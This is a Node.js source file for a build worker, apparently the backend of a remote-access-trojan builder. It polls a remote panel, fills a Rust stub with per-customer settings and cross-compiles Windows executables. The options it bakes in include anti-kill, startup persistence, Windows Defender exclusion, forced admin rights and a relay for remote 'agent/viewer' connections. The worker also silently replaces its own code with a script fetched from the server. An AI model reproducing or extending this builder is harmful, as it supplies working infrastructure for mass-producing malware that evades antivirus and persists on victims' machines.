// ─────────────────────────────────────────────────────────────────────────────
// HidenHost build worker — runs inside the hidenhost process (as a child_process
// fork) and does what buildserver/build.py used to do:
//
//   1. Poll  https://wallahis.lovable.app/api/public/buildserver/poll
//   2. On a queued build, fetch the Rust stub, render placeholders,
//      spawn `cargo build --release --target x86_64-pc-windows-gnu`
//      in a fresh temp dir, stream progress back, upload the .exe,
//      then delete the temp dir.
//
// Isolated from the WS relay process so a crashing build never drops
// agent/viewer sockets.
// ─────────────────────────────────────────────────────────────────────────────

'use strict';

const os = require('os');
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');
const { randomUUID } = require('crypto');

const FRONTEND   = (process.env.FRONTEND_URL || 'https://wallahis.lovable.app').replace(/\/+$/, '');
const KEY        = process.env.BUILDSERVER_KEY || '';
const POLL_MS    = parseInt(process.env.BUILD_POLL_MS || '4000', 10);
const RUST_TARGET = process.env.RUST_TARGET || 'x86_64-pc-windows-gnu';
const WORK_ROOT  = process.env.BUILD_WORK_DIR || path.join(os.tmpdir(), 'hidenhost-builds');
const SUPABASE_URL      = process.env.SUPABASE_URL      || '';
const SUPABASE_ANON_KEY = process.env.SUPABASE_ANON_KEY || '';
const HIDEN_AUTH_KEY    = process.env.HIDEN_AUTH_KEY    || '';
const RELAY_URL         = process.env.PUBLIC_WS_URL     || process.env.RELAY_URL || 'wss://umad.hidenmc.com';

const UA = 'hidenhost-build-worker/1.0';
const HDR = { 'X-Buildserver-Key': KEY, 'User-Agent': UA };

fs.mkdirSync(WORK_ROOT, { recursive: true });

function log(level, msg)   { process.stdout.write(`[build:${level}] ${msg}\n`); }
const info  = m => log('info',  m);
const warn  = m => log('warn',  m);
const err   = m => log('error', m);
const ok    = m => log('ok',    m);

function api(p) { return `${FRONTEND}/api/public/buildserver/${p}`; }

async function j(url, init = {}) {
  init.headers = { ...HDR, ...(init.headers || {}) };
  const r = await fetch(url, init);
  return r;
}

async function poll() {
  try {
    const r = await j(api('poll'));
    if (r.status === 204) return null;
    if (!r.ok) { warn(`poll → HTTP ${r.status}`); return null; }
    const body = await r.json();
    const builds = body.builds || (body.build ? [body.build] : []);
    return { build: builds[0] || null, live: body };
  } catch (e) { warn(`poll error: ${e.message}`); return null; }
}

async function progress(buildId, pct, message = '', status = 'building', extra = {}) {
  try {
    await j(api('progress'), {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ build_id: buildId, progress: pct, status, message, ...extra }),
    });
  } catch (_) {}
}

async function fetchStub(platform = 'windows') {
  const url = api('stub') + (platform !== 'windows' ? `?platform=${platform}` : '');
  const r = await j(url);
  if (!r.ok) throw new Error(`stub → HTTP ${r.status}`);
  const body = await r.json();
  return body.files || {};
}

function rustStr(s) {
  return String(s)
    .replace(/\\/g, '\\\\').replace(/"/g, '\\"')
    .replace(/\r/g, '\\r').replace(/\n/g, '\\n').replace(/\t/g, '\\t');
}

function render(src, ctx) {
  let out = src;
  for (const [k, v] of Object.entries(ctx)) {
    out = out.split(`{{${k}}}`).join(String(v));
  }
  // leftover placeholder cleanup
  out = out.replace(/\{\{([A-Z0-9_]+)\}\}/g, (_m, k) => {
    if (k.startsWith('FEATURE_') || ['DEBUG', 'STARTUP_TASK', 'ANTIKILL'].includes(k)) return 'false';
    return '';
  });
  return out;
}

function writeTree(dir, files) {
  for (const [name, src] of Object.entries(files)) {
    const fp = path.join(dir, name);
    fs.mkdirSync(path.dirname(fp), { recursive: true });
    fs.writeFileSync(fp, src);
  }
}

function rmrf(dir) {
  try { fs.rmSync(dir, { recursive: true, force: true }); } catch (_) {}
}

function runCargo(cwd, args, onLine) {
  return new Promise((resolve) => {
    const proc = spawn('cargo', args, { cwd, env: process.env });
    let buf = '';
    const feed = (chunk) => {
      buf += chunk.toString();
      let i;
      while ((i = buf.indexOf('\n')) >= 0) {
        onLine(buf.slice(0, i).replace(/\r$/, ''));
        buf = buf.slice(i + 1);
      }
    };
    proc.stdout.on('data', feed);
    proc.stderr.on('data', feed);
    proc.on('close', (code) => {
      if (buf) onLine(buf);
      resolve(code);
    });
    proc.on('error', (e) => { onLine(`spawn error: ${e.message}`); resolve(127); });
  });
}

async function uploadArtifact(buildId, filename, bytes, mime = 'application/octet-stream') {
  const boundary = '----hh' + randomUUID().replace(/-/g, '');
  const pre = Buffer.from(
    `--${boundary}\r\nContent-Disposition: form-data; name="build_id"\r\n\r\n${buildId}\r\n` +
    `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${filename}"\r\n` +
    `Content-Type: ${mime}\r\n\r\n`
  );
  const post = Buffer.from(`\r\n--${boundary}--\r\n`);
  const body = Buffer.concat([pre, bytes, post]);
  const r = await fetch(api('upload'), {
    method: 'POST',
    headers: { ...HDR, 'Content-Type': `multipart/form-data; boundary=${boundary}` },
    body,
  });
  if (!r.ok) throw new Error(`upload → HTTP ${r.status}: ${(await r.text()).slice(0, 200)}`);
  return r.json().catch(() => ({}));
}

async function buildWindows(b, live) {
  const bid = b.id;
  const name = b.name || 'agent';
  const safe = (name.match(/[A-Za-z0-9_\-]+/g) || ['agent']).join('_');
  info(`▶ ${bid.slice(0,8)} windows (${safe})`);
  await progress(bid, 5, 'fetching stub');

  const stub = await fetchStub('windows');
  const relayUrl  = b.relay_url || RELAY_URL;
  const relayHttp = relayUrl.replace(/^wss:\/\//, 'https://').replace(/^ws:\/\//, 'http://');

  const ctx = {
    USER_ID:          rustStr(b.user_id),
    API_BASE:         rustStr(b.target_server_url || FRONTEND),
    RELAY_URL:        rustStr(relayUrl),
    RELAY_HTTP_URL:   rustStr(relayHttp),
    BUILD_NAME:       safe,
    STARTUP_NAME:     rustStr(b.startup_name || name),
    DEBUG:            b.debug ? 'true' : 'false',
    FEATURE_STARTUP:  b.startup ? 'true' : 'false',
    FEATURE_ANTIKILL: b.antikill ? 'true' : 'false',
    FEATURE_FUN:      b.fun_features ? 'true' : 'false',
    FEATURE_WD_EXCLUSION:    b.wd_exclusion ? 'true' : 'false',
    FEATURE_REQUIRE_ADMIN:   b.require_admin ? 'true' : 'false',
    BUILD_TAG:        rustStr(b.tag || ''),
    SUPABASE_URL:     rustStr(live.supabase_url || SUPABASE_URL),
    SUPABASE_ANON_KEY:rustStr(live.supabase_anon_key || SUPABASE_ANON_KEY),
    HIDEN_AUTH_KEY:   rustStr(live.hiden_auth_key || HIDEN_AUTH_KEY),
    // Per-machine identity: never bake a device_id into the EXE.
    // Each machine the EXE runs on calls /api/public/agent/auto-register
    // and saves its own unique id in %APPDATA%\sentinel\<buildName>.json,
    // so two machines running the same EXE never collide on the relay.
    BIND_DEVICE_ID:    rustStr(''),
    BIND_DEVICE_TOKEN: rustStr(''),
  };

  const bdir = path.join(WORK_ROOT, bid);
  rmrf(bdir); fs.mkdirSync(bdir, { recursive: true });
  const rendered = Object.fromEntries(Object.entries(stub).map(([k, v]) => [k, render(v, ctx)]));
  writeTree(bdir, rendered);
  info(`  wrote ${Object.keys(rendered).length} files → ${bdir}`);
  await progress(bid, 20, `cargo build --release --target ${RUST_TARGET}`);

  const args = ['build', '--release', '--target', RUST_TARGET,
                '--manifest-path', path.join(bdir, 'Cargo.toml')];
  if (!b.debug && RUST_TARGET.includes('windows')) args.push('--features', 'windowed');

  let lastPing = Date.now(), lines = 0;
  const code = await runCargo(bdir, args, (line) => {
    lines++;
    if (/^\s*Compiling\s/.test(line)) {
      const crate = line.trim().split(/\s+/)[1] || '?';
      if (Date.now() - lastPing > 8000) {
        progress(bid, Math.min(75, 20 + Math.floor(lines / 6)), `compiling ${crate}`);
        lastPing = Date.now();
      }
    } else if (/^\s*error/.test(line)) {
      err(`  ${line.trim()}`);
    }
  });

  if (code !== 0) {
    await progress(bid, 100, `cargo exit ${code}`, 'failed');
    rmrf(bdir);
    return;
  }

  await progress(bid, 85, 'locating binary');
  const ext = RUST_TARGET.includes('windows') ? '.exe' : '';
  const outName = `${safe}${ext}`;
  const releaseDir = path.join(bdir, 'target', RUST_TARGET, 'release');
  let built = path.join(releaseDir, outName);
  if (!fs.existsSync(built)) {
    const found = fs.readdirSync(releaseDir).find(f =>
      (ext ? f.endsWith(ext) : !f.includes('.')) && fs.statSync(path.join(releaseDir, f)).size > 10_000
    );
    if (found) built = path.join(releaseDir, found);
  }
  if (!fs.existsSync(built)) {
    await progress(bid, 100, 'binary not found', 'failed');
    rmrf(bdir); return;
  }

  const bytes = fs.readFileSync(built);
  const kb = Math.floor(bytes.length / 1024);
  await progress(bid, 90, `uploading (${kb} KB)`);
  try {
    const up = await uploadArtifact(bid, outName, bytes);
    await progress(bid, 100, 'done', 'success', { download_url: up.download_url });
    ok(`${bid.slice(0,8)} → ${up.download_url || '(uploaded)'} (${kb} KB)`);
  } catch (e) {
    await progress(bid, 100, e.message, 'failed');
    err(e.message);
  } finally {
    rmrf(bdir);
  }
}

async function tick() {
  const p = await poll();
  if (!p || !p.build) return;
  const { build, live } = p;
  try {
    if ((build.platform || 'windows') === 'windows') await buildWindows(build, live);
    else { await progress(build.id, 100, `platform ${build.platform} not supported in this worker`, 'failed'); }
  } catch (e) {
    err(`build exception: ${e.message}`);
    try { await progress(build.id, 100, e.message, 'failed'); } catch (_) {}
  }
}

function which(cmd) {
  return new Promise((resolve) => {
    const p = spawn(process.platform === 'win32' ? 'where' : 'which', [cmd]);
    let out = '';
    p.stdout.on('data', (d) => (out += d));
    p.on('close', (c) => resolve(c === 0 ? out.trim().split(/\r?\n/)[0] : null));
    p.on('error', () => resolve(null));
  });
}

function runLogged(cmd, args, opts = {}) {
  return new Promise((resolve) => {
    const p = spawn(cmd, args, { stdio: ['ignore', 'pipe', 'pipe'], ...opts });
    const feed = (d) => d.toString().split(/\r?\n/).forEach((l) => l && info(`  ${l}`));
    p.stdout.on('data', feed);
    p.stderr.on('data', feed);
    p.on('close', (code) => resolve(code));
    p.on('error', (e) => { warn(`spawn ${cmd}: ${e.message}`); resolve(127); });
  });
}

async function ensureRust() {
  if (await which('cargo')) return true;

  // Add ~/.cargo/bin to PATH in case it's installed but not exported
  const cargoBin = path.join(os.homedir(), '.cargo', 'bin');
  if (fs.existsSync(path.join(cargoBin, process.platform === 'win32' ? 'cargo.exe' : 'cargo'))) {
    process.env.PATH = `${cargoBin}${path.delimiter}${process.env.PATH || ''}`;
    if (await which('cargo')) { ok('found cargo in ~/.cargo/bin, PATH patched'); return true; }
  }

  if (process.platform === 'win32') {
    warn('cargo missing on Windows — install Rust manually from https://rustup.rs');
    return false;
  }

  info('cargo not found — installing Rust via rustup (one-time, ~2 min)…');
  // Install rustup + default toolchain
  const sh = await which('sh');
  if (!sh) { err('sh not available — cannot auto-install Rust'); return false; }
  const code = await runLogged('sh', ['-c',
    'curl --proto "=https" --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y --default-toolchain stable --profile minimal',
  ], { env: { ...process.env, RUSTUP_HOME: path.join(os.homedir(), '.rustup'), CARGO_HOME: path.join(os.homedir(), '.cargo') } });
  if (code !== 0) { err(`rustup install exit ${code}`); return false; }
  process.env.PATH = `${cargoBin}${path.delimiter}${process.env.PATH || ''}`;
  if (!(await which('cargo'))) { err('rustup finished but cargo still missing'); return false; }
  ok('rust installed');

  // Add the Windows cross target
  if (RUST_TARGET && RUST_TARGET !== (process.arch + '-' + process.platform)) {
    info(`adding rust target ${RUST_TARGET}…`);
    await runLogged('rustup', ['target', 'add', RUST_TARGET]);
  }

  // On Linux we also need the mingw-w64 linker for the gnu windows target
  if (RUST_TARGET.includes('windows-gnu') && process.platform === 'linux' && !(await which('x86_64-w64-mingw32-gcc'))) {
    const isRoot = (process.getuid && process.getuid() === 0);
    const hasSudo = await which('sudo');
    const prefix = isRoot ? '' : (hasSudo ? 'sudo -n ' : '');
    let installed = false;
    if (isRoot || hasSudo) {
      info('installing mingw-w64 linker via package manager…');
      if (await which('apt-get'))      await runLogged('sh', ['-c', `${prefix}apt-get update -y && ${prefix}apt-get install -y mingw-w64`]);
      else if (await which('dnf'))     await runLogged('sh', ['-c', `${prefix}dnf install -y mingw64-gcc`]);
      else if (await which('apk'))     await runLogged('sh', ['-c', `${prefix}apk add --no-cache mingw-w64-gcc`]);
      installed = await which('x86_64-w64-mingw32-gcc');
    }
    if (!installed) {
      // No root / no sudo / no package manager → fetch portable llvm-mingw
      info('no root access — downloading portable llvm-mingw toolchain…');
      const toolDir = path.join(os.homedir(), '.llvm-mingw');
      const binDir  = path.join(toolDir, 'bin');
      if (!fs.existsSync(path.join(binDir, 'x86_64-w64-mingw32-gcc'))) {
        fs.mkdirSync(toolDir, { recursive: true });
        const url = 'https://github.com/mstorsjo/llvm-mingw/releases/download/20240619/llvm-mingw-20240619-ucrt-ubuntu-20.04-x86_64.tar.xz';
        const tar = path.join(os.tmpdir(), 'llvm-mingw.tar.xz');
        info(`  fetching ${url}`);
        const c1 = await runLogged('sh', ['-c', `curl -fsSL "${url}" -o "${tar}"`]);
        if (c1 !== 0) { warn('llvm-mingw download failed'); }
        else {
          await runLogged('sh', ['-c', `tar -xJf "${tar}" -C "${toolDir}" --strip-components=1 && rm -f "${tar}"`]);
        }
      }
      if (fs.existsSync(binDir)) {
        process.env.PATH = `${binDir}${path.delimiter}${process.env.PATH || ''}`;
        ok(`llvm-mingw ready at ${binDir}`);
      }
    }
    if (!(await which('x86_64-w64-mingw32-gcc'))) warn('mingw-w64 linker still not on PATH — windows-gnu builds will fail');
    else ok('mingw-w64 linker available');
  }


  return true;
}

// Self-update: pull the latest worker script from the app and, if it differs
// from this file, overwrite ourselves and exit — server.js respawns us with
// the new code within 5s. No server commands ever needed.
async function selfUpdate() {
  try {
    const r = await j(api('worker-script'));
    if (!r.ok) { warn(`self-update check → HTTP ${r.status}`); return; }
    const remote = await r.text();
    const self = path.join(__dirname, 'build-worker.js');
    const local = fs.readFileSync(self, 'utf8');
    // Normalize line endings so a CRLF upload doesn't loop forever.
    if (remote.replace(/\r\n/g, '\n').trim() === local.replace(/\r\n/g, '\n').trim()) return;
    fs.writeFileSync(self, remote);
    ok('self-update applied — restarting worker');
    process.exit(0); // server.js respawns the worker automatically
  } catch (e) {
    warn(`self-update check failed: ${e.message}`);
  }
}

async function loop() {
  info(`build worker → ${FRONTEND} (poll ${POLL_MS}ms, target ${RUST_TARGET})`);
  if (!KEY) { err('BUILDSERVER_KEY empty — exiting'); process.exit(2); }
  await selfUpdate();
  await ensureRust();
  let busy = false;
  setInterval(async () => {
    if (busy) return;
    busy = true;
    try { await tick(); } finally { busy = false; }
  }, POLL_MS);
}

loop();

